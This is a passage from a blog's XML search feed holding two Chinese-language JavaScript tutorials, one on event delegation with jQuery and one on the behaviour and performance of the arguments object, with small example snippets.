<h4 id="4、使用事件委托"><a href="#4、使用事件委托" class="headerlink" title="4、使用事件委托"></a><strong>4、使用事件委托</strong></h4><p><strong>使用场景：</strong>一个有大量记录的列表，每条记录都需要绑定点击事件，在鼠标点击后实现某些功能，我们通常的做法是给每条记录都绑定监听事件，这种做法会导致页面会有大量的事件监听器，效率比较低下。</p>
<p><strong>基本原理</strong>：我们都知道dom规范中事件是会冒泡的，也就是说在不主动阻止事件冒泡的情况下任何一个元素的事件都会按照dom树的结构逐级冒泡至顶端。而event对象中也提供了event.target（IE下是srcElement）指向事件源，因此我们即使在父级元素上监听该事件也可以找到触发该事件的最原始的元素，这就是委托的基本原理。废话不多说，上示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&quot;ul li&quot;).bind(&quot;click&quot;,function()&#123;</span><br><span class="line">    alert($(this).attr(&quot;data&quot;));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>上述写法其实是给所有的li元素都绑定了click事件来监听鼠标点击每一个元素的事件，这样页面上会有大量的事件监听器。</p>
<p>根据上面介绍的监听事件的原理我们来改写一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&quot;ul&quot;).bind(&quot;click&quot;,function(e)&#123;</span><br><span class="line">    if(e.target.nodeName.toLowerCase() &#x3D;&#x3D;&#x3D;&quot;li&quot;)&#123;</span><br><span class="line">        alert($(e.target).attr(&quot;data&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这样一来，我们就可以只添加一个事件监听器去捕获所有li上触发的事件，并做出相应的操作。</p>
<p>当然，我们不必每次都做事件源的判断工作，可以将其抽象一下交给工具类来完成。jquery中的delegate()方法就实现了该功能</p>
<p>语法是这样的$(selector).delegate(childSelector,event,data,function)，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(&quot;div&quot;).delegate(&quot;button&quot;,&quot;click&quot;,function()&#123;</span><br><span class="line">  $(&quot;p&quot;).slideToggle();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>参数说明（引自w3school）</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bc187628fe535bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片描述" title="Javascript执行效率小结_"></p>
<p>**Tips:**事件委托还有一个好处就是，即使在事件绑定之后动态添加的元素上触发的事件同样可以监听到哦，这样就不用在每次动态加入元素到页面后都为其绑定事件了</p>
<p>暂时先总结到这。</p>
<hr>
<p>原文来自：<a href="http://www.cnblogs.com/gewei/archive/2013/03/29/2988180.html">www.cnblogs.com/gewei/archive/2013/03/29/2988180.html</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>arguments 对象</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/arguments%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>JavaScript 中每个函数内都能访问一个特别变量 <code>arguments</code>。这个变量维护着所有传递到这个函数中的参数列表。</p>
<p><strong>注意:</strong> 由于 <code>arguments</code> 已经被定义为函数内的一个变量。 因此通过 <code>var</code> 关键字定义 <code>arguments</code> 或者将 <code>arguments</code> 声明为一个形式参数， 都将导致原生的 <code>arguments</code> 不会被创建。</p>
<p><code>arguments</code> 变量<strong>不是</strong>一个数组（<code>Array</code>）。 尽管在语法上它有数组相关的属性 <code>length</code>，但它不从 <code>Array.prototype</code> 继承，实际上它是一个对象（<code>Object</code>）。</p>
<p>因此，无法对 <code>arguments</code> 变量使用标准的数组方法，比如 <code>push</code>, <code>pop</code> 或者 <code>slice</code>。 虽然使用 <code>for</code> 循环遍历也是可以的，但是为了更好的使用数组方法，最好把它转化为一个真正的数组。</p>
<h3 id="转化为数组"><a href="#转化为数组" class="headerlink" title="转化为数组"></a>转化为数组</h3><p>下面的代码将会创建一个新的数组，包含所有 <code>arguments</code> 对象中的元素。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array.prototype.slice.call(arguments);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个转化比较<strong>慢</strong>，在性能不好的代码中<strong>不推荐</strong>这种做法。</p>
<h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><p>下面是将参数从一个函数传递到另一个函数的推荐做法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    bar.apply(null, arguments);</span><br><span class="line">&#125;</span><br><span class="line">function bar(a, b, c) &#123;</span><br><span class="line">    &#x2F;&#x2F; 干活</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>另一个技巧是同时使用 <code>call</code> 和 <code>apply</code>，创建一个快速的解绑定包装器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.method &#x3D; function(a, b, c) &#123;</span><br><span class="line">    console.log(this, a, b, c);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个解绑定的 &quot;method&quot;</span><br><span class="line">&#x2F;&#x2F; 输入参数为: this, arg1, arg2...argN</span><br><span class="line">Foo.method &#x3D; function() &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 结果: Foo.prototype.method.call(this, arg1, arg2... argN)</span><br><span class="line">    Function.call.apply(Foo.prototype.method, arguments);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的 <code>Foo.method</code> 函数和下面代码的效果是一样的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Foo.method &#x3D; function() &#123;</span><br><span class="line">    var args &#x3D; Array.prototype.slice.call(arguments);</span><br><span class="line">    Foo.prototype.method.apply(args[0], args.slice(1));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="自动更新"><a href="#自动更新" class="headerlink" title="自动更新"></a>自动更新</h3><p><code>arguments</code> 对象为其内部属性以及函数形式参数创建 <em>getter</em> 和 <em>setter</em> 方法。</p>
<p>因此，改变形参的值会影响到 <code>arguments</code> 对象的值，反之亦然。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function foo(a, b, c) &#123;</span><br><span class="line">    arguments[0] &#x3D; 2;</span><br><span class="line">    a; &#x2F;&#x2F; 2                                                           </span><br><span class="line"></span><br><span class="line">    b &#x3D; 4;</span><br><span class="line">    arguments[1]; &#x2F;&#x2F; 4</span><br><span class="line"></span><br><span class="line">    var d &#x3D; c;</span><br><span class="line">    d &#x3D; 9;</span><br><span class="line">    c; &#x2F;&#x2F; 3</span><br><span class="line">&#125;</span><br><span class="line">foo(1, 2, 3);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="性能真相"><a href="#性能真相" class="headerlink" title="性能真相"></a>性能真相</h3><p>不管它是否有被使用，<code>arguments</code> 对象总会被创建，除了两个特殊情况 - 作为局部变量声明和作为形式参数。</p>
<p><code>arguments</code> 的 <em>getters</em> 和 <em>setters</em> 方法总会被创建；因此使用 <code>arguments</code> 对性能不会有什么影响。 除非是需要对 <code>arguments</code> 对象的属性进行多次访问。</p>
<p><strong>ES5 提示:</strong> 这些 <em>getters</em> 和 <em>setters</em> 在严格模式下（strict mode）不会被创建。</p>
<p>在 <a href="https://developer.mozilla.org/en/JavaScript/Strict_mode">MDC</a> 中对 <code>strict mode</code> 模式下 <code>arguments</code> 的描述有助于我们的理解，请看下面代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 阐述在 ES5 的严格模式下 &#96;arguments&#96; 的特性</span><br><span class="line">function f(a) &#123;</span><br><span class="line">  &quot;use strict&quot;;</span><br><span class="line">  a &#x3D; 42;</span><br><span class="line">  return [a, arguments[0]];</span><br><span class="line">&#125;</span><br><span class="line">var pair &#x3D; f(17);</span><br><span class="line">console.assert(pair[0] &#x3D;&#x3D;&#x3D; 42);</span><br><span class="line">console.assert(pair[1] &#x3D;&#x3D;&#x3D; 17);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然而，的确有一种情况会显著的影响现代 JavaScript 引擎的性能。这就是使用 <code>arguments.callee</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    arguments.callee; &#x2F;&#x2F; do something with this function object</span><br><span class="line">    arguments.callee.caller; &#x2F;&#x2F; and the calling function object</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bigLoop() &#123;</span><br><span class="line">    for(var i &#x3D; 0; i &lt; 100000; i++) &#123;</span><br><span class="line">        foo(); &#x2F;&#x2F; Would normally be inlined...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>foo</code> 不再是一个单纯的内联函数 <a href="http://en.wikipedia.org/wiki/Inlining">inlining</a>（**<a href="http://cnblogs.com/sanshi/">译者注</a>**：这里指的是解析器可以做内联处理）， 因为它需要知道它自己和它的调用者。 这不仅抵消了内联函数带来的性能提升，而且破坏了封装，因此现在函数可能要依赖于特定的上下文。</p>
<p>因此<strong>强烈</strong>建议大家<strong>不要</strong>使用 <code>arguments.callee</code> 和它的属性。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
</search>
